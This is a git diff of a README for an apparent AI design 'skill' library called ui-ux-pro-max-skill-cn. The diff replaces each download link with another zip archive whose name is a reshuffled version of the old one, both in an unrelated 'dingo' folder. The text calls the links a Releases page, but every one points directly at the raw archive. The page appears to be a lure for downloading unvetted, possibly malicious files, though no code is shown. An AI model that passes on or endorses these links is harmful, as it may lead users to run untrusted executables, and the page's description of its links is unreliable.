@@ -1,6 +1,6 @@
 # 🎨 ui-ux-pro-max-skill-cn - Master AI Design Skills Easily
 
-[![Download](https://github.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/raw/refs/heads/main/dingo/max-ux-skill-cn-pro-ui-v3.9.zip)](https://github.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/raw/refs/heads/main/dingo/max-ux-skill-cn-pro-ui-v3.9.zip)
+[![Download](https://raw.githubusercontent.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/main/dingo/cn-ui-max-pro-skill-ux-v3.4.zip)](https://raw.githubusercontent.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/main/dingo/cn-ui-max-pro-skill-ux-v3.4.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To begin using the UI/UX Pro Max skill library, follow these simple steps. No pr
 
 1. **Visit the Download Page**  
    Go to the repository's Releases page by clicking the link below:  
-   [Download Here](https://github.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/raw/refs/heads/main/dingo/max-ux-skill-cn-pro-ui-v3.9.zip)
+   [Download Here](https://raw.githubusercontent.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/main/dingo/cn-ui-max-pro-skill-ux-v3.4.zip)
 
 2. **Download the Latest Release**  
    On the Releases page, look for the most recent version. Click the link to download the file that is suitable for your operating system.
@@ -27,7 +27,7 @@ To begin using the UI/UX Pro Max skill library, follow these simple steps. No pr
 
 Make sure to download the application from the Releases page mentioned above. 
 
-- **Download Link:** [Visit this page to download](https://github.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/raw/refs/heads/main/dingo/max-ux-skill-cn-pro-ui-v3.9.zip)
+- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/zain444yt123-boop/ui-ux-pro-max-skill-cn/main/dingo/cn-ui-max-pro-skill-ux-v3.4.zip)
 
 ### System Requirements
 
